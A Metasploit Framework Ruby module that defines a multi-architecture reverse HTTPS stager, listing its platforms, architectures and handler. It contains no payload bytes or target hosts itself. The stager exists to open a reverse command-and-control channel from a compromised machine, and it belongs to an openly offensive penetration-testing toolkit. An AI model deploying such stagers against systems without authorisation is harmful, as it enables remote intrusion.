##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_https'
require 'msf/core/payload/multi/reverse_https'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Stager
  include Msf::Payload::Multi::ReverseHttps

  # TODO: Add something to this that stops it from being usable from
  # inside msfvenom (technically this isn't a payload)
  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Reverse HTTPS Stager (multi-arch)',
      'Description' => 'Tunnel communication over HTTPS (multi-architecture)',
      'Author'      => 'OJ Reeves',
      'License'     => MSF_LICENSE,
      'Platform'    => %w{ android java linux osx php python unix win },
      'Arch'        => [ARCH_X86, ARCH_X64, ARCH_PYTHON, ARCH_JAVA],
      'Handler'     => Msf::Handler::ReverseHttps,
      'Convention'  => 'https'))
  end

end
